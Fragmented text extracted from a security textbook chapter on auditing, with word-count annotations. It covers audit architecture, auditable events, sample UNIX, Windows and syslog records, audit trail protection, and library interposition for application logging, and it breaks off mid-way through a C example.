This model illustrates the relationship between audit functions and alarm 
­functions. The audit function builds up a record of events that are defined by the 
security administrator to be security related. Some of these events may in fact 
be security violations or suspected security violations. Such events feed into an 
­intrusion detection or firewall function by means of alarms.
[Word Count: 59]

As was the case with intrusion detection, a distributed auditing function in 
which a centralized repository is created can be useful for distributed systems. 
Two additional logical components are needed for a distributed auditing service 
(Figure 18.2):
[Word Count: 37]

• Audit trail collector: A module on a centralized system that collects audit trail
[Word Count: 14]

records from other systems and creates a combined audit trail.
 
• Audit dispatcher: A module that transmits the audit trail records from its local
[Word Count: 24]

system to the centralized audit trail collector.
[Word Count: 7]

It is useful to look at another breakdown of the security auditing function, ­developed 
as part of the Common Criteria specification [CCPS12a]. Figure 18.3 shows a 
­breakdown of security auditing into six major areas, each of which has one or more 
specific functions:
[Word Count: 43]

• Data generation: Identifies the level of auditing, enumerates the types of
[Word Count: 12]

­auditable events, and identifies the minimum set of audit-related information
[Word Count: 10]

18.1 / Security Auditing Architecture   581
[Word Count: 6]

provided. This function must also deal with the conflict between security and 
privacy and specify for which events the identity of the user associated with an 
action is included in the data generated as a result of an event.
 
• Event selection: Inclusion or exclusion of events from the auditable set. This
[Word Count: 52]

allows the system to be configured at different levels of granularity to avoid 
the creation of an unwieldy audit trail.
 
• Event storage: Creation and maintenance of the secure audit trail. The storage
[Word Count: 33]

function includes measures to provide availability and to prevent loss of data 
from the audit trail.
 
• Automatic response: Defines reactions taken following detection of events
[Word Count: 26]

that are indicative of a potential security violation.
 
• Audit analysis: Provided via automated mechanisms to analyze system activity
[Word Count: 19]

and audit data in search of security violations. This component identifies the 
set of auditable events whose occurrence or accumulated occurrence indicates 
a potential security violation. For such events, an analysis is done to determine 
if a security violation has occurred; this analysis uses anomaly detection and 
attack heuristics.
 
• Audit review: As available to authorized users to assist in audit data ­review. The
[Word Count: 64]

audit review component may include a selectable review function that provides 
the ability to perform searches based on a single criterion or ­multiple criteria 
with logical (i.e., and/or) relations, sort audit data, and filter audit data before 
audit data are reviewed. Audit review may be restricted to ­authorized users.
[Word Count: 49]

Reviewing the functionality suggested by Figures 18.1 and 18.3, we can develop a set 
of requirements for security auditing. The first requirement is event definition. The 
security administrator must define the set of events that are subject to audit. We go 
into more detail in the next section, but we include here a list suggested in [CCPS12a]:
[Word Count: 57]

• Introduction of objects within the security-related portion of the software into
[Word Count: 12]

Figure 18.2  Distributed Audit Trail Model (X.816)
[Word Count: 7]

• Deletion of objects
 
• Distribution or revocation of access rights or capabilities
 
• Changes to subject or object security attributes
 
• Policy checks performed by the security software as a result of a request by a
[Word Count: 37]

subject
 
• The use of access rights to bypass a policy check
[Word Count: 12]

Protected audit trail storage
Guarantees of audit data availability
[Word Count: 9]

Action in case of possible audit data loss
Prevention of audit data loss
[Word Count: 13]

Audit analysis
Proﬁle-based anomaly detection
[Word Count: 5]

Potential violation analysis
Simple attack heuristics
Complex attack heuristics
[Word Count: 9]

Figure 18.3  Common Criteria Security Audit Class Decomposition
[Word Count: 8]

18.1 / Security Auditing Architecture   583
[Word Count: 6]

• Use of identification and authentication functions
 
• Security-related actions taken by an operator and/or authorized user (e.g.,
[Word Count: 18]

suppression of a protection mechanism)
 
• Import/export of data from/to removable media (e.g., printed output, tapes,
[Word Count: 16]

A second requirement is that the appropriate hooks must be available in the 
application and system software to enable event detection. Monitoring software 
needs to be added to the system and to appropriate places to capture relevant 
­activity. Next is needed an event recording function, which includes the need to 
provide for a secure storage resistant to tampering or deletion. Event and audit trail 
analysis software, tools, and interfaces may be used to analyze collected data as well 
as for investigating data trends and anomalies.
[Word Count: 85]

There is an additional requirement for the security of the auditing function. 
Not just the audit trail, but all of the auditing software and intermediate storage 
must be protected from bypass or tampering. Finally, the auditing system should 
have a minimal effect on functionality.
[Word Count: 44]

The ISO3 standard Code of Practice for Information Security Management 
(ISO 27002) provides a useful set of guidelines for implementation of an auditing 
capability:
[Word Count: 24]

1.	 Audit requirements should be agreed with appropriate management.
	
2.	 The scope of the checks should be agreed and controlled.
	
3.	 The checks should be limited to read-only access to software and data.
	
4.	 Access other than read-only should only be allowed for isolated copies of
[Word Count: 46]

­system files, which should be erased when the audit is completed or given 
appropriate protection if there is an obligation to keep such files under audit 
documentation requirements.
	
5.	 Resources for performing the checks should be explicitly identified and made
[Word Count: 40]

available.
	
6.	 Requirements for special or additional processing should be identified and
[Word Count: 12]

agreed.
	
7.	 All access should be monitored and logged to produce a reference trail; the
[Word Count: 15]

use of timestamped reference trails should be considered for critical data or 
systems.
	
8.	 All procedures, requirements, and responsibilities should be documented.
	
9.	 The person(s) carrying out the audit should be independent of the activities
[Word Count: 35]

3International Organization for Standardization. See Appendix C for a discussion of this and other 
­standards-making organizations.
[Word Count: 16]

Audit trails maintain a record of system activity. This section surveys issues related 
to audit trails.
[Word Count: 16]

The choice of data to collect is determined by a number of requirements. One 
issue is the amount of data to collect, which is determined by the range of areas of 
interest and by the granularity of data collection. There is a trade-off here between 
quantity and efficiency. The more data are collected, the greater is the performance 
penalty on the system. Larger amounts of data may also unnecessarily burden the 
various algorithms used to examine and analyze the data. Further, the presence of 
large amounts of data creates a temptation to generate security reports excessive in 
­number or length.
[Word Count: 100]

With these cautions in mind, the first order of business in security audit trail 
design is the selection of data items to capture. These may include:
[Word Count: 26]

• Events related to the use of the auditing software (i.e., all the components of
[Word Count: 15]

Figure 18.1).
 
• Events related to the security mechanisms on the system.
 
• Any events that are collected for use by the various security detection and
[Word Count: 26]

­prevention mechanisms. These include items relevant to intrusion detection 
(e.g., Table 8.2) and items related to firewall operation (e.g., Tables 9.3 and 9.4).
 
• Events related to system management and operation.
 
• Operating system access (e.g., via system calls).
 
• Application access for selected applications.
 
• Remote access.
[Word Count: 48]

Another useful list of auditable events (Table 18.3) is contained in ISO 27002. 
As with X.816, the ISO standard details both authorized and unauthorized events, 
as well as events affecting the security functions of the system.
[Word Count: 36]

As the security administrator designs an audit data collection policy, it is 
­useful to organize the audit trail into categories for purposes of choosing data items 
to collect. In what follows, we look at useful categories for audit trail design.
[Word Count: 40]

Table 18.2  Auditable Items Suggested in X.816
[Word Count: 7]

Security-related events related to 
a specific connection
[Word Count: 7]

–	Connection requests
–	Connection confirmed
–	Disconnection requests
–	Disconnection confirmed
–	Statistics appertaining to the ­connection
[Word Count: 18]

Security-related events related to the use of 
­security services
[Word Count: 9]

–	Security service requests
–	Security mechanisms usage
–	Security alarms
[Word Count: 11]

Security-related events related to management
[Word Count: 5]

–	Management operations
–	Management notifications
[Word Count: 6]

The list of auditable events should include 
at least
[Word Count: 9]

–	Deny access
–	Authenticate
–	Change attribute
–	Create object
–	Delete object
–	Modify object
–	Use privilege
[Word Count: 20]

In terms of the individual security services, the following 
security-related events are important
[Word Count: 13]

–	Authentication: verify success
–	Authentication: verify fail
–	Access control: decide access success
–	Access control: decide access fail
–	Nonrepudiation: nonrepudiable origination of message
–	Nonrepudiation: nonrepudiable receipt of message
–	Nonrepudiation: unsuccessful repudiation of event
–	Nonrepudiation: successful repudiation of event
–	Integrity: use of shield
–	Integrity: use of unshield
–	Integrity: validate success
–	Integrity: validate fail
–	Confidentiality: use of hide
–	Confidentiality: use of reveal
–	Audit: select event for auditing
–	Audit: deselect event for auditing
–	Audit: change audit event selection criteria
[Word Count: 91]

Table 18.3  Monitoring Areas Suggested in ISO 27002
[Word Count: 8]

Authorized access, including details such as
	 1)	 the user ID
	 2)	 the date and time of key events
	 3)	 the types of events
	 4)	 the files accessed
	 5)	 the program/utilities used
[Word Count: 31]

All privileged operations, such as
	 1)	 use of privileged accounts, for example
[Word Count: 12]

supervisor, root, administrator
	 2)	 system start-up and stop
	 3)	 I/O device attachment/detachment
[Word Count: 12]

Unauthorized access attempts, such as
	 1)	 failed or rejected user actions
	 2)	 failed or rejected actions involving data
[Word Count: 18]

and other resources
	 3)	 access policy violations and notifications
[Word Count: 9]

for network gateways and firewalls
	 4)	 alerts from proprietary intrusion detection
[Word Count: 11]

System alerts or failures such as
	 1)	 console alerts or messages
	 2)	 system log exceptions
	 3)	 network management alarms
	 4)	 alarms raised by the access control system
[Word Count: 27]

Changes to, or attempts to change, system security 
­settings and controls
[Word Count: 11]

System-Level Audit Trails  System-level audit trails are generally used to 
monitor and optimize system performance but can serve a security audit function 
as well. The system enforces certain aspects of security policy, such as access to the 
system itself. A system-level audit trail should capture data such as login attempts, 
both successful and unsuccessful, devices used, and OS functions performed. Other 
system-level functions may be of interest for auditing, such as system operation and 
network performance indicators.
[Word Count: 77]

Figure 18.4a, from [NIST95], is an example of a system-level audit trail on 
a UNIX system. The shutdown command terminates all processes and takes the 
­system down to single-user mode. The su command creates a UNIX shell.
[Word Count: 37]

Jan 27    17:14:04    host1    login: ROOT LOGIN console
Jan 27    17:15:04    host1    shutdown: reboot by root
Jan 27    17:18:38    host1    login: ROOT LOGIN console
Jan 27    17:19:37    host1    reboot: rebooted by root
Jan 28    09:46:53    host1    su: 'su root' succeeded for user1 on /dev/ttyp0
Jan 28    09:47:35    host1    shutdown: reboot by user1
Jan 28    09:53:24    host1    su: 'su root' succeeded for user1 on /dev/ttyp1
Feb 12    08:53:22    host1    su: 'su root' succeeded for user1 on /dev/ttyp1
Feb 17    08:57:50    host1    date: set by user1
Feb 17    13:22:52    host1    su: 'su root' succeeded for user1 on /dev/ttyp0
[Word Count: 96]

(a) Sample system log file showing authentication messages
[Word Count: 8]

Apr	 9	
11:20:22	
host1	
AA06370:	
from=<user2@host2>, size=3355, class=0
Apr	 9	
11:20:22	
host1	
AA06370:	
to=<user1@host1>, delay=00:00:02,stat=Sent
Apr	 9	
11:59:51	
host1	
AA06436:	
from=<user4@host3>, size=1424, class=0
Apr	 9	
11:59:52	
host1	
AA06436:	
to=<user1@host1>, delay=00:00:02, stat=Sent
Apr	 9	
12:43:52	
host1	
AA06441:	
from=<user2@host2>, size=2077, class=0
Apr	 9	
12:43:53	
host1	
AA06441:	
to=<user1@host1>, delay=00:00:01, stat=Sent
[Word Count: 47]

(b) Application-level audit record for a mail delivery system
[Word Count: 9]

rcp	
user1	
ttyp0	
0.02 secs Fri Apr 8 16:02
ls	
user1	
ttyp0	
0.14 secs Fri Apr 8 16:01
clear	
user1	
ttyp0	
0.05 secs Fri Apr 8 16:01
rpcinfo	
user1	
ttyp0	
0.20 secs Fri Apr 8 16:01
nroff	
user2	
ttyp2	
0.75 secs Fri Apr 8 16:00
sh	
user2	
ttyp2	
0.02 secs Fri Apr 8 16:00
mv	
user2	
ttyp2	
0.02 secs Fri Apr 8 16:00
sh	
user2	
ttyp2	
0.03 secs Fri Apr 8 16:00
col	
user2	
ttyp2	
0.09 secs Fri Apr 8 16:00
man	
user2	
ttyp2	
0.14 secs Fri Apr 8 15:57
[Word Count: 90]

(c) User log showing a chronological list of commands executed by users
[Word Count: 12]

Figure 18.4b is an example of an application-level audit trail for a mail ­delivery 
system.
[Word Count: 15]

User-Level Audit Trails  A user-level audit trail traces the activity of individual 
users over time. It can be used to hold a user accountable for his or her actions. Such 
audit trails are also useful as input to an analysis program that attempts to define 
normal versus anomalous behavior.
[Word Count: 49]

A user-level audit trail can record user interactions with the system,  
such as commands issued, identification and authentication attempts, and  
files and resources accessed. The audit trail can also capture the user’s use of 
applications.
[Word Count: 35]

Figure 18.4c is an example of a user-level audit trail on a UNIX system.
[Word Count: 14]

Physical Access Audit Trails  Audit trails can be generated by equipment 
that controls physical access and then transmitted to a central host for subsequent 
storage and analysis. Examples are card-key systems and alarm systems. [NIST95] 
lists the following as examples of the type of data of interest:
[Word Count: 47]

• The date and time the access was attempted or made should be logged,
[Word Count: 14]

as should the gate or door through which the access was attempted or  
made, and the individual (or user ID) making the attempt to access the gate 
or door.
 
• Invalid attempts should be monitored and logged by noncomputer audit trails
[Word Count: 41]

just as they are for computer system audit trails. Management should be made 
aware if someone attempts to gain access during unauthorized hours.
 
• Logged information should also include attempts to add, modify, or delete
[Word Count: 35]

physical access privileges (e.g., granting a new employee access to the building 
or granting transferred employees access to their new office [and, of course, 
deleting their old access, as applicable]).
 
• As with system and application audit trails, auditing of noncomputer functions
[Word Count: 42]

can be implemented to send messages to security personnel indicating valid or 
invalid attempts to gain access to controlled spaces. In order not to desensitize 
a guard or monitor, all access should not result in messages being sent to a 
screen. Only exceptions, such as failed access attempts, should be highlighted 
to those monitoring access.
[Word Count: 55]

RFC 2196 (Site Security Handbook) lists three alternatives for storing audit 
records:
[Word Count: 12]

• Read/write file on a host
 
• Write-once/read-many device (e.g., CD-ROM or DVD-ROM)
 
• Write-only device (e.g., a line printer)
[Word Count: 20]

File system logging is relatively easy to configure and is the least resource 
intensive. Records can be accessed instantly, which is useful for countering an 
ongoing attack. However, this approach is highly vulnerable. If an attacker gains 
privileged access to a system, then the audit trail is vulnerable to modification or 
deletion.
[Word Count: 52]

A CD-ROM or similar storage method is far more secure but less convenient. 
A steady supply of recordable media is needed. Access may be delayed and not 
available immediately.
[Word Count: 29]

Printed logs do provide a paper trail, but are impractical for capturing detailed 
audit data on large systems or networked systems. RFC 2196 suggests that the paper 
log can be useful when a permanent, immediately available log is required even 
with a system crash.
[Word Count: 44]

Protection of the audit trail involves both integrity and confidentiality. Integrity 
is particularly important because an intruder may attempt to remove ­evidence of 
the intrusion by altering the audit trail. For file system logging, ­perhaps the best way 
to ensure integrity is the digital signature. Write-once devices, such as CD-ROM or 
paper, automatically provide integrity. Strong access control is another measure to 
provide integrity.
[Word Count: 64]

Confidentiality is important if the audit trail contains user information that 
is sensitive and should not be disclosed to all users, such as information about 
changes in a salary or pay grade status. Strong access control helps in this regard. 
An effective measure is symmetric encryption (e.g., using AES [Advanced 
Encryption Standard] or triple DES [Data Encryption Standard]). The secret key 
must be protected and only available to the audit trail software and subsequent 
audit analysis software.
[Word Count: 77]

Note that integrity and confidentiality measures protect audit trail data not 
only in local storage but also during transmission to a central repository.
[Word Count: 23]

The foundation of a security auditing facility is the initial capture of the audit 
data. This requires that the software include hooks, or capture points, that trig-
ger the ­collection and storage of data as preselected events occur. Such an audit 
collection or logging function is dependent on the nature of the software and will 
vary depending on the underlying operating system and the applications involved. 
In this section, we look at approaches to implementing the logging function for 
system-level and user-level audit trails on the one hand and application-level audit 
trails on the other.
[Word Count: 95]

18.3 / Implementing The Logging Function   589
[Word Count: 7]

Much of the logging at the system level can be implemented using existing facilities that 
are part of the operating system. In this section, we look at the facility in the Windows 
operating system and then at the syslog facility found in UNIX operating systems.
[Word Count: 45]

Windows Event Log  An event in Windows Event Log is an entity that describes 
some interesting occurrence in a computer system. Events contain a numeric 
identification code, a set of attributes (task, opcode, level, version, and keywords), 
and optional user-supplied data. Windows is equipped with three types of event logs:
[Word Count: 50]

• System event log: Used by applications running under system service accounts
[Word Count: 12]

(installed system services), drivers, or a component or application that has 
events that relate to the health of the computer system.
 
• Application event log: Events for all user-level applications. This log is not
[Word Count: 34]

secured and it is open to any applications. Applications that log extensive 
information should define an application-specific log.
 
• Security event log: The Windows Audit Log. This event log is for exclusive use
[Word Count: 33]

of the Windows Local Security Authority. User events may appear as audits if 
supported by the underlying application.
[Word Count: 18]

For all of the event logs, or audit trails, event information can be stored in 
an XML format. Table 18.4 lists the items of information stored for each event. 
Figure 18.5 is an example of data exported from a Windows system event log.
[Word Count: 43]

Table 18.4  Windows Event Schema Elements
[Word Count: 6]

Property values of an event that contains binary data
The LevelName Windows software trace preproces-
sor (WPP) debug tracing field used in debug events 
in debug channels
[Word Count: 27]

Binary data supplied by Windows Event Log
Level that will be rendered for an event
[Word Count: 15]

Channel into which the rendered event is published
Level of severity for an event
[Word Count: 14]

Complex data for a parameter supplied by the event 
provider
[Word Count: 10]

FormattedString WPP debug tracing field used in 
debug events in debug channels
[Word Count: 12]

ComponentName WPP debug tracing field used in 
debug events
[Word Count: 9]

Computer that the event occurred on
Opcode that will be rendered for an event
[Word Count: 14]

Two 128-bit values that can be used to find related 
events
[Word Count: 11]

The activity or a point within an activity that the 
application was performing when it raised the event
[Word Count: 18]

Name of the event data item that caused an error 
when the event data was processed
[Word Count: 16]

Elements that define an instrumentation event
[Word Count: 6]

Data that makes up one part of the complex data 
type supplied by the event provider
[Word Count: 16]

Information about the event provider that published 
the event
[Word Count: 9]

Data for a parameter supplied by the event provider
Event publisher that published the rendered event
[Word Count: 16]

Property values of Windows software trace prepro-
cessor (WPP) events
[Word Count: 10]

Information that will be rendered for an event
[Word Count: 8]

Windows allows the system user to enable auditing in nine different 
­categories:
[Word Count: 12]

• Account logon events: User authentication activity from the perspective of
[Word Count: 11]

the system that validated the attempt. Examples: authentication granted; 
­authentication ticket request failed; account mapped for logon; account 
could not be mapped for logon. Individual actions in this category are not
[Word Count: 31]

Error code that was raised when there was an error 
processing event data
[Word Count: 13]

A structured piece of information that describes 
some interesting occurrence in the system
[Word Count: 13]

SequenceNum WPP debug tracing field used in 
debug events in debug channels
[Word Count: 12]

Event identification number
SubComponentName WPP debug tracing field used 
in debug events in debug channels
[Word Count: 15]

Information about the process and thread in which 
the event occurred
[Word Count: 11]

Information automatically populated by the system 
when the event is raised or when it is saved into the 
log file
[Word Count: 20]

Binary event data for the event that caused an error 
when the event data was processed
[Word Count: 16]

Information about the process and thread the event 
occurred in
[Word Count: 10]

FileLine WPP debug tracing field used in debug 
events in debug channels
[Word Count: 12]

Information about the time the event occurred
[Word Count: 7]

FlagsName WPP debug tracing field used in debug 
events in debug channels
[Word Count: 12]

Provider-defined portion that may consist of any 
valid XML content that communicates event 
­information
[Word Count: 14]

KernelTime WPP debug tracing field used in debug 
events in debug channels
[Word Count: 12]

UserTime WPP debug tracing field used in debug 
events in debug channels
[Word Count: 12]

Keywords that will be rendered for an event
Event version
[Word Count: 10]

Figure 18.5  Windows System Log Entry Example
[Word Count: 7]

Event Type:	
Success Audit
Event Source:	
Security
Event Category:	
(1)
Event ID:	
517
Date:	
3/6/2006
Time:	
2:56:40 PM
User:	
NT AUTHORITY\SYSTEM
Computer:	
KENT
Description:	
The audit log was cleared
Primary User Name:	
SYSTEM	
Primary Domain:	
NT AUTHORITY
Primary Logon ID:	
(0x0,0x3F7)	
Client User Name:	
userk
Client Domain:	
KENT	
Client Logon ID:	
(0x0,0x28BFD)
[Word Count: 52]

18.3 / Implementing The Logging Function   591
[Word Count: 7]

particularly instructive, but large numbers of failures may indicate scanning 
activity, ­brute-force attacks on individual accounts, or the propagation of 
automated exploits.
 
• Account management: Administrative activity related to the creation,
[Word Count: 31]

­management, and deletion of individual accounts and user groups. Examples: 
user account created; change password attempt; user account deleted; security 
enabled global group member added; domain policy changed.
 
• Directory service access: User-level access to any Active Directory object that
[Word Count: 40]

has a System Access Control List defined. An SACL creates a set of users and 
user groups for which granular auditing is required.
 
• Logon events: User authentication activity, either to a local machine or over
[Word Count: 36]

a network, from the system that originated the activity. Examples: successful 
user logon; logon failure, unknown username, or bad password; logon failure, 
because account is disabled; logon failure, because account has expired; logon 
failure, user not allowed to logon at this computer; user logoff; logon failure, 
account locked out.
 
• Object access: User-level access to file system and registry objects that have
[Word Count: 62]

System Access Control Lists defined. Provides a relatively easy way to track 
read access, as well as changes, to sensitive files, integrated with the operating 
system. Examples: object open; object deleted.
 
• Policy changes: Administrative changes to the access policies, audit config-
[Word Count: 42]

uration, and other system-level settings. Examples: user right assigned; new 
trusted domain; audit policy changed.
 
• Privilege use: Windows incorporates the concept of a user right, granular ­permission
[Word Count: 28]

to perform a particular task. If you enable privilege use auditing, you record all 
instances of users exercising their access to particular system functions (creating 
objects, debugging executable code, or backing up the ­system). Examples: ­specified 
privileges were added to a user’s access token (during logon); a user attempted to 
perform a privileged system service operation.
 
• Process tracking: Generates detailed audit information when processes
[Word Count: 65]

start and finish, programs are activated, or objects are accessed indi-
rectly. Examples: new process was created; process exited; auditable data 
was ­protected; ­auditable data was unprotected; user attempted to install a 
­service.
 
• System events: Records information on events that affect the availability and
[Word Count: 45]

integrity of the system, including boot messages and the system shutdown 
message. Examples: system is starting; Windows is shutting down; resource 
exhaustion in the logging subsystem; some audits lost; audit log cleared.
[Word Count: 32]

Syslog  Syslog is UNIX’s general-purpose logging mechanism found on all UNIX 
variants and Linux. It consists of the following elements:
[Word Count: 20]

• syslog(): An application program interface (API) referenced by several
[Word Count: 10]

­standard system utilities and available to application programs
 
• logger: A UNIX command used to add single-line entries to the system log
[Word Count: 22]

• /etc/syslog.conf: The configuration file used to control the logging and
[Word Count: 11]

routing of system log events
 
• syslogd: The system daemon used to receive and route system log events
[Word Count: 18]

from syslog() calls and logger commands.
[Word Count: 6]

Different UNIX implementations will have different variants of the syslog 
­facility, and there are no uniform system log formats across systems. Chapter 25 
examines the Linux syslog facility. Here, we provide a brief overview of some 
­syslog-related functions and look at the syslog protocol.
[Word Count: 44]

The basic service offered by UNIX syslog is a means of capturing relevant events, 
a storage facility, and a protocol for transmitting syslog messages from other machines 
to a central machine that acts as a syslog server. In addition to these basic functions, 
other services are available, often as third-party packages and in some cases as built-in 
modules. [KENT06] lists the following as being the most common extra features:
[Word Count: 69]

• Robust filtering: Original syslog implementations allowed messages to be
[Word Count: 10]

­handled differently based on their facility and priority only; no finer-grained 
filtering was permitted. Some current syslog implementations offer more 
­robust filtering capabilities, such as handling messages differently based 
on the host or program that generated a message, or a regular expression 
­matching content in the body of a message. Some implementations also 
­allow multiple filters to be applied to a single message, which provides more 
­complex ­filtering capabilities.
 
• Log analysis: Originally, syslog servers did not perform any analysis of log data;
[Word Count: 83]

they simply provided a framework for log data to be recorded and transmitted. 
Administrators could use separate add-on programs for analyzing syslog data. 
Some syslog implementations now have limited log analysis capabilities ­built-in, 
such as the ability to correlate multiple log entries.
 
• Event response: Some syslog implementations can initiate actions when certain
[Word Count: 53]

events are detected. Examples of actions include sending SNMP traps, alerting 
administrators through pages or e-mails, and launching a separate program or 
script. It is also possible to create a new syslog message that indicates that a 
certain event was detected.
 
• Alternative message formats: Some syslog implementations can accept data
[Word Count: 51]

in non-syslog formats, such as SNMP traps. This can be helpful for getting 
­security event data from hosts that do not support syslog and cannot be 
­modified to do so.
[Word Count: 30]

• Log file encryption: Some syslog implementations can be configured to encrypt
[Word Count: 12]

rotated log files automatically, protecting their confidentiality. This can also 
be accomplished through the use of OS or third-party encryption ­programs.
 
• Database storage for logs: Some implementations can store log entries in both
[Word Count: 34]

traditional syslog files and a database. Having the log entries in a database 
format can be very helpful for subsequent log analysis.
 
• Rate limiting: Some implementations can limit the number of syslog ­messages
[Word Count: 34]

or TCP connections from a particular source during a certain period of time. 
This is useful in preventing a denial of service for the syslog server and the
[Word Count: 28]

18.3 / Implementing The Logging Function   593
[Word Count: 7]

loss of syslog messages from other sources. Because this technique is designed 
to cause the loss of messages from a source that is overwhelming the syslog 
server, it can cause some log data to be lost during an adverse event that 
­generates an unusually large number of messages.
[Word Count: 48]

Messages in the BSD syslog format consist of three parts:
[Word Count: 10]

• PRI: Consists of a code that represents the Facilities and Severity values of the
[Word Count: 15]

message, described subsequently.
 
• Header: Contains a timestamp and an indication of the hostname or IP address
[Word Count: 17]

of the device.
 
• Msg: Consists of two fields: The TAG field is the name of the program or
[Word Count: 19]

process that generated the message; the CONTENT contains the details of the 
message. The Msg part has traditionally been a free-form message of printable 
characters that gives some detailed information of the event.
[Word Count: 33]

Figure 18.6 shows several examples of syslog messages, excluding the  
PRI part.
[Word Count: 12]

Figure 18.6  Examples of Syslog Messages
[Word Count: 6]

Mar 1 06:25:43 server1 sshd[23170]: Accepted publickey for server2 from
172.30.128.115 port 21011 ssh2
[Word Count: 14]

Mar 1 07:16:42 server1 sshd[9326]: Accepted password for murugiah from
10.20.30.108 port 1070 ssh2
[Word Count: 14]

Mar 1 07:16:53 server1 sshd[22938]: reverse mapping checking getaddrinfo
for ip10.165.nist.gov failed - POSSIBLE BREAKIN ATTEMPT!
[Word Count: 16]

Mar 1 07:26:28 server1 sshd[22572]: Accepted publickey for server2 from
172.30.128.115 port 30606 ssh2
[Word Count: 14]

Mar 1 07:28:33 server1 su: BAD SU kkent to root on /dev/ttyp2
[Word Count: 12]

Mar 1 07:28:41 server1 su: kkent to root on /dev/ttyp2
[Word Count: 10]

All messages sent to syslogd have a facility and a severity (Table 18.5). 
The ­facility identifies the application or system component that generates the 
­message. The severity, or message level, indicates the relative severity of the 
­message and can be used for some rudimentary filtering.
[Word Count: 45]

Applications, especially those with a certain level of privilege, present ­security 
­problems that may not be captured by system-level or user-level auditing data. 
Application-level vulnerabilities constitute a large percentage of reported 
­vulnerabilities on security mailing lists. One type of vulnerability that can be
[Word Count: 43]

Table 18.5  UNIX syslog Facilities and Severity Levels
[Word Count: 8]

Facility
Message Description (generated by)
[Word Count: 5]

auth
Authorization programs login, su, and getty
[Word Count: 7]

Syslogd
Messages generated internally by syslogd
[Word Count: 6]

Local use 0–7
Up to 8 locally defined categories
[Word Count: 9]

emerg
Most severe messages, such as immediate system shutdown
[Word Count: 9]

alert
System conditions requiring immediate attention
[Word Count: 6]

crit
Critical system conditions, such as failing hardware or software
[Word Count: 10]

notice
unusual situation that merits investigation; a significant event
that is typically part of normal day-to-day operation
[Word Count: 17]

18.3 / Implementing The Logging Function   595
[Word Count: 7]

exploited is the all-too-frequent lack of dynamic checks on input data, which make 
possible buffer overflow (see Chapter 10). Other ­vulnerabilities exploit errors in 
application logic. For example, a privileged application may be designed to read and 
print a specific file. An error in the application might allow an attacker to exploit an 
unexpected interaction with the shell environment to force the application to read 
and print a different file, which would result in a security compromise.
[Word Count: 77]

In the remainder of this section, we examine two approaches to collecting 
audit data from applications: interposable libraries and dynamic binary rewriting.
[Word Count: 22]

A technique described in [KUPE99] and [KUPE04] provides for application-level 
auditing by creating new procedures that intercept calls to shared library functions 
in order to instrument the activity. Interposition allows the generation of audit 
data without needing to recompile either the system libraries or the application of 
­interest. Thus, audit data can be generated without changing the system’s shared 
libraries or needing access to the source code for the executable on which the 
­interposition is to be performed. This approach can be used on any UNIX or Linux 
variant and on some other operating systems.
[Word Count: 95]

The technique exploits the use of dynamic libraries in UNIX. Before ­examining 
the technique, we provide a brief background on shared libraries.
[Word Count: 22]

needs to be recompiled, not the executable programs that reference it. However, 
the ­modification generally must be minor; the changes must be made in such a way 
that the start address and the address of any variables, constants, or program labels 
in the code are not changed.
[Word Count: 47]

UNIX System V Release 4 introduced the concept of dynamically linked 
shared libraries. With dynamically linked libraries, the linking to shared library 
routines is deferred until load time. At this time, the desired library contents are 
mapped into the process’s virtual address space. Thus, if changes are made to the 
library prior to load time, any program that references the library is unaffected.
[Word Count: 63]

For both statically and dynamically linked shared libraries, the memory pages 
of the shared pages must be marked read-only. The system uses a copy-on-write 
scheme if a program performs a memory update on a shared page: The system assigns 
a copy of the page to the process, which it can modify without affecting other users 
of the page.
[Word Count: 58]

The Use of Interposable Libraries  Figure 18.7a indicates the normal mode of 
operation when a program invokes a routine in dynamically linked shared libraries. 
At load time, the reference to routine foo in the program is resolved to the virtual 
memory address of the start of the foo in the shared library.
[Word Count: 52]

With library interpolation, a special interposable library is constructed so that 
at load time, the program links to the interposable library instead of the shared 
library. For each function in the shared library for which auditing is to be invoked, 
the interposable library contains a function with the same name. If the desired 
­function is not contained in the interposed library, the loader continues its search in 
the shared library and links directly with the target function.
[Word Count: 77]

The interposed module can perform any auditing-related function, such 
as recording the fact of the call, the parameters passed and returned, the return 
address in the calling program, and so forth. Typically, the interposed module will 
call the actual shared function (Figure 18.7b) so that the application’s behavior is 
not altered, just instrumented.
[Word Count: 53]

This technique allows the interception of certain function calls and the ­storage 
of state between such calls without requiring the recompilation of the calling 
­program or shared objects.
[Word Count: 28]

[KUPE99] gives an example of an interposable library function written in C 
(Figure 18.8). The function can be described as follows:
[Word Count: 21]

1.	 AUDIT_CALL_START (line 8) is placed at the beginning of every inter-
[Word Count: 12]

posed function. This makes it easy to insert arbitrary initialization code into 
each function.
	
2.	 AUDIT_LOOKUP_COMMAND (line 10 in Figure 18.8a, detail in
[Word Count: 23]

Figure 18.8b) performs the lookup of the pointer to the next definition of the 
function in the shared libraries using the dlsym(3x) command. The special flag 
RTLD_NEXT (Figure 18.8b, line 2), indicates that the next reference along the 
library search path used by the run-time loader will be returned. The function 
pointer is stored in fptr if a reference is found, or the error value is returned to 
the calling program.
[Word Count: 71]

18.3 / Implementing The Logging Function   597
[Word Count: 7]

3.	 Line 12 contains the commands that are executed before the function is called.
	
4.	 In this case, the interposed function executes the original function call and
[Word Count: 27]

returns the value to the user (line 14). Other possible actions include the 
examination, recording, or transformation of the arguments; the prevention 
of the actual execution of the library call; and the examination, recording, or 
transformation of the return value.
	
5.	 Additional code could be inserted before the result is returned (line 16), but
[Word Count: 54]

Figure 18.7  The Use of an Interposable Library
[Word Count: 8]

The interposition technique is designed to work with dynamically linked shared 
libraries. It cannot intercept function calls of statically linked programs unless all 
programs in the system are relinked at the time that the audit library is introduced. 
[ZHOU04] describes a technique, referred to as dynamic binary rewriting, that can 
be used with both statically and dynamically linked programs.
[Word Count: 59]

Dynamic binary rewriting is a postcompilation technique that directly 
changes the binary code of executables. The change is made at load time and 
modifies only the memory image of a program, not the binary program file on 
secondary storage. As with the interposition technique, dynamic binary rewriting 
does not require recompilation of the application binary. Audit module selection 
is postponed until the application is invoked, allowing for flexible selection of the 
auditing configuration.
[Word Count: 73]

The technique is implemented on Linux using two modules: a loadable kernel 
module and a monitoring daemon. Linux is structured as a collection of modules, 
a number of which can be automatically loaded and unloaded on demand. These 
relatively independent blocks are referred to as loadable modules [GOYE99]. 
In essence, a module is an object file whose code can be linked to and unlinked from
[Word Count: 65]

Figure 18.8  Example of Function in the Interposed Library
[Word Count: 9]

1 /****************************************
2 * Logging the use of certain functions *
3 ****************************************/
4 char *strcpy(char *dst, const char *src) {
5	
char *(*fptr)(char *,const char *);	
/* pointer to the real function */
6	
